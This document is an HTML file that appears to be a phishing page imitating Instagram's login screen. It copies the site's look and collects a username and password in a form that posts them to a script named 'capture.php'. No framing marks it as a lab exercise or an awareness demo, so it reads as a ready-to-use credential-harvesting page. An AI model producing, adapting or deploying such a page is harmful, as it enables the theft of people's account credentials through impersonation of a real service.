<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 40px;
      width: 350px;
      text-align: center;
    }

    .login-container h1 {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      color: #262626;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 10px;
      text-align: left;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
    }

    .btn {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      background-color: #0095f6;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn:hover {
      background-color: #007ac1;
    }

    .options {
      margin-top: 20px;
      font-size: 14px;
      color: #8e8e8e;
    }

    .options a {
      color: #0095f6;
      text-decoration: none;
    }

    .options a:hover {
      text-decoration: underline;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .divider::before {
      margin-right: 10px;
    }

    .divider::after {
      margin-left: 10px;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Instagram</h1>
    <form action="./capture.php" method="POST">
      <div class="input-group">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
      </div>
      <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password" required>
      </div>
      <button type="submit" class="btn">Log In</button>
      <div class="divider">OR</div>
      <div class="options">
        <a href="#">Log in with Facebook</a>
        <br>
        <a href="#">Forgot password?</a>
      </div>
    </form>
    <div class="footer">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
</body>
</html>
